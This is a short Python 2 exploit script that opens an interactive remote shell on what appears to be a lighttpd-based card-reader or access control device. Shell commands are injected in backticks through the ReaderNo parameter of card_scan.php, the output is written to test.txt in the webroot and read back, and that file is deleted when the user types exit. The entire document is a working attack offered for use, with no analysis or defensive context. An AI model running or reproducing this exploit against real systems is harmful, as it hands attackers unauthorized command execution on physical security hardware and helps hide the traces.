import requests
import sys,os##

piton = os.path.basename(sys.argv[0])

if len(sys.argv) < 2:
	sys.exit()

ipaddr = sys.argv[1]

print
while True:
	try:
		cmd = raw_input('lighttpd@'+ipaddr+':/spider/web/webroot$ ')
		execute = requests.get('http://'+ipaddr+'/card_scan.php?No=30&ReaderNo=%60'+cmd+' > test.txt%60')
		readreq = requests.get('http://'+ipaddr+'/test.txt')
		print readreq.text
		if cmd.strip() == 'exit':
			print "[+] Erasing read stage file and exiting..."
			requests.get('http://'+ipaddr+'/card_scan.php?No=30&ReaderNo=%60rm test.txt%60')
			print "[+] Done. Ba-bye!\n"
			break
		else: continue
	except Exception:
		break

sys.exit()
